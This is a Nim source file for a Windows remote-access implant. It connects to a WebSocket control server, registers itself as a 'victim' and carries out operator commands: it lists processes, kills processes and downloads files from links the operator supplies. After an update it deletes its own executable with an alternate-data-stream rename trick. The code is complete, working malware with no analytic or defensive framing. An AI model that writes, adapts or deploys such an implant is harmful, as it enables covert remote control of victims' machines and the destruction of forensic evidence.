import asyncdispatch, ws, json, strutils, os,winim/com,winim,system,std/[asyncdispatch, httpclient, osproc]

proc getProcessList(): seq[string] =
  var wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  var processList: seq[string] = @[]
  for i in wmi.execQuery("select * from win32_process"):
    processList.add(i.name)

  return processList

proc WCHARArrayToString(arr: array[0..259, WCHAR]): string =
  var resultStr = ""
  for i in 0..<arr.len:
    if arr[i] == 0'u16: 
      break
    resultStr.add(cast[char](arr[i]))
  return resultStr

proc killprocess(process:string):bool =
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE:
        echo "Failed to get process snapshot."
        return false

    var procEntry: PROCESSENTRY32
    procEntry.dwSize = int32(sizeof(PROCESSENTRY32))  

    if Process32First(snapshot, addr procEntry):
        while Process32Next(snapshot, addr procEntry) != 0:
            if WCHARArrayToString(procEntry.szExeFile) == process:
                let hProcess = OpenProcess(PROCESS_TERMINATE, false, procEntry.th32ProcessID)
                if hProcess != INVALID_HANDLE_VALUE:
                    let success = TerminateProcess(hProcess, 1)
                    echo hProcess
                    CloseHandle(hProcess)
                    CloseHandle(snapshot)
                    echo "Process terminated."
                    return true
                else:
                    echo "Failed to open process."
                    return false
    CloseHandle(snapshot)
    echo "something went wrong"

var DS_STREAM_RENAME = newWideCString(":wtfbbq")

proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = DS_STREAM_RENAME
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

proc self_delete() =
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath))

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        echo "[-] Failed to get the current module handle"
        quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo "[-] Failed to acquire handle to current running process"
        quit(QuitFailure)

    echo "[*] Attempting to rename file name"
    if not ds_rename_handle(hCurrent).bool:
        echo "[-] Failed to rename to stream"
        quit(QuitFailure)

    echo "[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle"
    CloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo "[-] Failed to reopen current module"
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        echo "[-] Failed to set delete deposition"
        quit(QuitFailure)

    echo "[*] Closing handle to trigger deletion deposition"
    CloseHandle(hCurrent)

    if not PathFileExistsW(addr wcPath[0]).bool:
        echo "[*] File deleted successfully"

proc downloadFile(link: string, name: string): Future[bool] {.async.} =
  let client = newAsyncHttpClient()
  try:
    await client.downloadFile(link, name)
    echo "File downloaded successfully."
    return true
  except Exception as e:
    echo "Error occurred during download or execution: ", e.msg
    return false
  finally:
    client.close()

proc main() {.async.} =
  var ws: WebSocket

  
  while true:
    try:
      ws = await newWebSocket("ws://192.168.1.101:20888/ws")
      echo "Connected to WebSocket server!"
      break 
    except OSError as e:
      echo "Failed to connect to WebSocket server: ", e.msg
      echo "Retrying in 5 seconds..."
      await sleepAsync(5000)  

 
  let jsonObj = %* {"type": "set_role", "role": "victim"}
  let jsonMessage = $jsonObj  
  await ws.send(jsonMessage)
  echo "Sent message: ", jsonMessage


  while true:
    let message = await ws.receiveStrPacket()
    echo "Received message: ", message


    var parsedJson = parseJson(message)


    if parsedJson.hasKey("type") and parsedJson["type"].getStr() == "exec":
      let command = parsedJson["command"].getStr()
      let client = parsedJson["client_id"].getStr()

      if command == "pwd":
 
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": getCurrentDir()
        }

        
        await ws.send($responseJson)
        echo "Sent response: ", $responseJson

      elif command == "tasklist":
        let processes = getProcessList()
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": processes
        }
        await ws.send($responseJson)
        echo "Sent response: ", $responseJson

      elif command.startsWith("kill"):
        let processName = command.splitWhitespace()[1]  
        let killResult = killprocess(processName)

        
        let responseJson = %* {
          "type": "exec",
          "client_id": client,
          "state": "res",
          "command": command,
          "data": if killResult: "Process terminated: " & processName
                  else: "Failed to terminate process: " & processName
        }

        await ws.send($responseJson)
        echo "Sent response: ", $responseJson
      
      elif command.startsWith("update"):
        let link = command.splitWhitespace()[1]  
        let name = command.splitWhitespace()[2]
        echo name
        echo link

        let success = await downloadFile(link, name)
        try:
          if success:
            let responseJson = %* {
              "type": "exec",
              "client_id": client,
              "state": "res",
              "command": command,
              "data": "download successful"
            }
            await ws.send($responseJson)
            self_delete()
            quit(0)
          else:
            let responseJson = %* {
              "type": "exec",
              "client_id": client,
              "state": "error",
              "command": command,
              "data": "download failed"
            }
            await ws.send($responseJson)
        except OSError as e:
          let responseJson = %* {
            "type": "exec",
            "client_id": client,
            "state": "error",
            "command": command,
            "data": "OS error: " & e.msg
          }
          await ws.send($responseJson)

        
  ws.close()
  echo "WebSocket connection closed."

waitFor main()
